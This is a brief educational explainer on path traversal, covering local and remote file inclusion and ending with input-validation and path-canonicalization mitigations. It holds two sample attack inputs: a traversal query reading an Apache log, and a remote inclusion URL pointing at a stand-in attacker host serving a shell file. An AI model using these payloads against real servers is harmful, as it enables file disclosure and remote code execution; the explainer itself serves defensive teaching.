# Path Traversal 

Path Traversal Vulnerability is when an attacker manipulates file or path input so a program accesses files or directories it shouldn’t. The reason for these vulnerabilities are due to trusting the user input and This might includes:

- Application code and data
- Credentials from the back-end systems
- Sensitive operating system files

In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.

## Types of Path Traversal 

1. **Local File Inclusion** (LFI)

A web application includes a file path into server side processing (e.g., include($path) in PHP). If an attacker controls $path, they can include arbitrary local files that located on the server 

Example: 

```
include($_GET['page']); → ?page=../../../../var/log/apache2/access.log
```

Information disclosure and often used with log poisoning to achieve code execution. Never include user provided paths directly. Use an allowlist of known include targets or map IDs to files for mitigation.

2. **Remote File Inclusion** (RFI)

The web application fetches and includes a remote resource (URL) specified by the user

Example: 

```
// remote URL 
?page=http://evil.example/shell.txt
```

Often used for the remote code execution. Disable remote includes (e.g., allow_url_include=Off in PHP), validate and restrict inputs is need to be done for the mitigation 

## Mitigation 

- Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.

